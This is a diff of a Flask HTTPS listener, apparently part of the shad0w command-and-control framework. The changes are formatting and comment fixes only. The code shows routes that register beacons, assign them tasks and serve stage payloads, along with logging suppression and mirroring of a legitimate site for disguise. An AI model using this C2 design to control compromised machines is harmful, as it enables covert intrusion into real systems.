@@ -11,12 +11,13 @@ from flask import Flask, request, jsonify, Response
 app = Flask(__name__)
 
 # shut flask output up
-log                    = logging.getLogger('werkzeug')
-log.disabled           = True
-cli                    = sys.modules['flask.cli']
+log = logging.getLogger('werkzeug')
+log.disabled = True
+cli = sys.modules['flask.cli']
 cli.show_server_banner = lambda *x: None
 
 IGNORE_CONTENT = ""
+
 
 @app.before_request
 def log_request():
@@ -24,8 +25,9 @@ def log_request():
 
     # shad0w.debug.log(request)
 
-    # do nothin jus return
+    # do nothing just return
     return None
+
 
 @app.route("/")
 def web_blank_page():
@@ -39,14 +41,16 @@ def web_blank_page():
     elif shad0w.mirror is not None:
         return shad0w.page_data
 
+
 @app.route("/register", methods=["GET", "POST"])
 def web_register_beacon():
     # register the beacon
 
     shad0w.debug.log("HTTP - '/register' was hit, attempting to register")
 
-    # just give it the request so it can pull stuff out itsself
+    # just give it the request so it can pull stuff out itself
     return phandle.register_beacon(request)
+
 
 @app.route("/tasks", methods=["GET", "POST"])
 def web_task_beacon():
@@ -54,11 +58,13 @@ def web_task_beacon():
 
     return phandle.task_beacon(request)
 
+
 @app.route("/stage", methods=["GET", "POST"])
 def web_stage_beacon():
     # send the requested stage to a beacon
 
     return phandle.stage_beacon(request)
+
 
 @app.errorhandler(404)
 def not_found(e):
@@ -77,7 +83,8 @@ def not_found(e):
         for obj in shad0w.beacons[shad0w.current_beacon]["serve"]:
             if obj == request.path:
                 return shad0w.beacons[shad0w.current_beacon]["serve"][obj]
-    except: pass
+    except:
+        pass
 
     if shad0w.mirror is None:
         return ""
@@ -90,17 +97,18 @@ def not_found(e):
 
     return Response(data, status_code, headers)
 
+
 def run_serv(*args):
     # cant think of a better way doing this so guess i gotta use globals
     global shad0w, phandle
-    shad0w  = args[0]
+    shad0w = args[0]
 
     phandle = Handler(shad0w)
 
-    shad0w.debug.log("starting flask http server")
+    shad0w.debug.log("Starting flask HTTP server")
     shad0w.debug.log(f"Starting HTTPS server ({shad0w.addr[0]}:{shad0w.addr[1]})", log=True)
 
-    shad0w.debug.log(f"creating ssl context with {shad0w.sslkey} & {shad0w.sslcrt}")
+    shad0w.debug.log(f"Creating SSL context with {shad0w.sslkey} & {shad0w.sslcrt}")
 
     try:
         app.run(host=shad0w.addr[0], port=shad0w.addr[1], ssl_context=(shad0w.sslcrt, shad0w.sslkey))
